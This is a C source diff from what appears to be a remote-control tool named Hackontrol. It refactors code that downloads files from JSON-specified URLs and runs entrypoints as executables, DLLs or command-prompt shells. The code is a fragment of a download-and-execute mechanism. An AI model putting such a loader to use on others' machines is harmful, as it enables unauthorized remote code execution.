@@ -1,4 +1,5 @@
 #include <khopanstring.h>
+#include <khopanjson.h>
 #include <hackontrolcurl.h>
 #include "execute.h"
 
@@ -11,14 +12,13 @@ typedef enum {
 
 static void processFileEntry(cJSON* root);
 static void processEntrypointEntry(cJSON* root);
-static EntrypointFormat parseFormat(cJSON* root);
 
 void ProcessFilesArray(cJSON* root) {
-	if(!cJSON_HasObjectItem(root, "file")) {
+	cJSON* file = cJSON_GetObjectItem(root, "file");
+
+	if(!file) {
 		return;
 	}
-
-	cJSON* file = cJSON_GetObjectItem(root, "file");
 
 	if(!cJSON_IsArray(file)) {
 		processFileEntry(file);
@@ -31,11 +31,11 @@ void ProcessFilesArray(cJSON* root) {
 }
 
 void ProcessEntrypointsArray(cJSON* root) {
-	if(!cJSON_HasObjectItem(root, "entrypoint")) {
+	cJSON* entrypoint = cJSON_GetObjectItem(root, "entrypoint");
+
+	if(!entrypoint) {
 		return;
 	}
-
-	cJSON* entrypoint = cJSON_GetObjectItem(root, "entrypoint");
 
 	if(!cJSON_IsArray(entrypoint)) {
 		processEntrypointEntry(entrypoint);
@@ -64,19 +64,15 @@ static void processFileEntry(cJSON* root) {
 		goto freeFilePath;
 	}
 
-	if(!cJSON_HasObjectItem(root, "url")) {
-		goto freeFilePath;
-	}
+	LPSTR url = KHJSONGetString(root, "url", NULL);
 
-	cJSON* urlField = cJSON_GetObjectItem(root, "url");
-
-	if(!cJSON_IsString(urlField)) {
+	if(!url) {
 		goto freeFilePath;
 	}
 
 	DataStream stream = {0};
 
-	if(!HackontrolDownloadData(&stream, cJSON_GetStringValue(urlField), TRUE, NULL)) {
+	if(!HackontrolDownloadData(&stream, url, TRUE, NULL)) {
 		goto freeFilePath;
 	}
 
@@ -87,8 +83,43 @@ freeFilePath:
 }
 
 static void processEntrypointEntry(cJSON* root) {
-	EntrypointFormat format = parseFormat(root);
+	if(!cJSON_HasObjectItem(root, "format")) {
+		return;
+	}
 
+	cJSON* formatField = cJSON_GetObjectItem(root, "format");
+	EntrypointFormat format = ENTRYPOINT_FORMAT_UNKNOWN;
+
+	if(cJSON_IsNumber(formatField)) {
+		unsigned int value = (unsigned int) cJSON_GetNumberValue(formatField);
+
+		if(value >= ENTRYPOINT_FORMAT_EXECUTABLE && value <= ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL) {
+			format = value;
+			goto processFormat;
+		}
+
+		return;
+	}
+
+	if(!cJSON_IsString(formatField)) {
+		return;
+	}
+
+	char* stringValue = cJSON_GetStringValue(formatField);
+
+	if(!lstrcmpiA(stringValue, "exe") || !lstrcmpiA(stringValue, "executable") || !lstrcmpiA(stringValue, "pe") || !lstrcmpiA(stringValue, "portable")) {
+		format = ENTRYPOINT_FORMAT_EXECUTABLE;
+		goto processFormat;
+	} else if(!lstrcmpiA(stringValue, "dll") || !lstrcmpiA(stringValue, "dynamic")) {
+		format = ENTRYPOINT_FORMAT_DYNAMIC_LINK_LIBRARY;
+		goto processFormat;
+	} else if(!lstrcmpiA(stringValue, "cmd") || !lstrcmpiA(stringValue, "command") || !lstrcmpiA(stringValue, "shell")) {
+		format = ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL;
+		goto processFormat;
+	}
+
+	return;
+processFormat:
 	if(format == ENTRYPOINT_FORMAT_UNKNOWN) {
 		return;
 	}
@@ -104,38 +135,4 @@ static void processEntrypointEntry(cJSON* root) {
 		ProcessEntrypointShell(root);
 		return;
 	}
-}
-
-static EntrypointFormat parseFormat(cJSON* root) {
-	if(!cJSON_HasObjectItem(root, "format")) {
-		return ENTRYPOINT_FORMAT_UNKNOWN;
-	}
-
-	cJSON* formatField = cJSON_GetObjectItem(root, "format");
-
-	if(cJSON_IsNumber(formatField)) {
-		unsigned int value = (unsigned int) cJSON_GetNumberValue(formatField);
-
-		if(value >= ENTRYPOINT_FORMAT_EXECUTABLE && value <= ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL) {
-			return value;
-		}
-
-		return ENTRYPOINT_FORMAT_UNKNOWN;
-	}
-
-	if(!cJSON_IsString(formatField)) {
-		return ENTRYPOINT_FORMAT_UNKNOWN;
-	}
-
-	char* stringValue = cJSON_GetStringValue(formatField);
-
-	if(!lstrcmpiA(stringValue, "exe") || !lstrcmpiA(stringValue, "executable") || !lstrcmpiA(stringValue, "pe") || !lstrcmpiA(stringValue, "portable")) {
-		return ENTRYPOINT_FORMAT_EXECUTABLE;
-	} else if(!lstrcmpiA(stringValue, "dll") || !lstrcmpiA(stringValue, "dynamic")) {
-		return ENTRYPOINT_FORMAT_DYNAMIC_LINK_LIBRARY;
-	} else if(!lstrcmpiA(stringValue, "cmd") || !lstrcmpiA(stringValue, "command") || !lstrcmpiA(stringValue, "shell")) {
-		return ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL;
-	}
-
-	return ENTRYPOINT_FORMAT_UNKNOWN;
 }
